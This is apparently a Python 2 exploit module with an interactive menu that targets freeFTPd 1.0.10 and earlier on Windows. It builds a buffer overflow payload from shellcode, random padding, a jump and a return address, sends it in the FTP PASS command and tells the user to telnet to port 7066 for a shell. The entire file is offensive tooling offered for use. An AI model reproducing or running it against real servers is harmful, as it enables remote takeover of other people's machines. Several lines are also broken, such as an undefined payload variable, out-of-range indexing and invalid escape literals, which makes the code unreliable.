import ftplib
import cmd
import random
from socket import AF_INET, SOCK_STREAM, socket, gethostbyname

def getToken(line):
    token = ""
    for letter in line:
        if letter != " ":
            token += letter
        else:
            break
    return token

class freeftpdPassOverflowMenu(cmd.Cmd):
  def __init__(self):
    cmd.Cmd.__init__(self)
    self.user = ["anonymous"]
    self.host = ["ftp.debian.org"]
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = getToken(args)
    val = args[len(var) + 3:]
    if var == "user":
      self.user[0] = val
    elif var == "host":
      self.host[0] = val
    else:
      print "*** Variable not found %s" % var
      return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    print "Target: freeFTPd version 1.0.10 and below on Windows"
    print "Options for freeftpd_pass_overflow:"
    print "========================"
    print "user    %s    the user to login in as" % self.user[0]
    print "passwd    %s    the password of the user" % self.passwd[0]
    print "host    %s    the IP of the target" % self.host[0]
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the freeftpd_pass_overflow context"
  def do_exit(self, args):
    if args:
      print "*** Number of argumnets: needed 0"
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.host[0]:
        self.host[0] = gethostbyname(self.host[0])
    print "[*]Generating payload..."
    off = 702
    f = open("../../../payloads/freeftpd_pass.shell", "r")
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    for a in range(0, off - len(payload)):
      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
    payload += "\xe9=\xfd\xff\xff"
    payload += "\xeb\xf9"
    for a in range(0, 2):
      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
    payload += "\xbb\x14\x40\x00"
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.host[0], 21))
    s.recv(1024)
    s.send("USER " + self.user[0])
    s.recv(1024)
    s.send("PASS " + payload)
    s.close()
    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
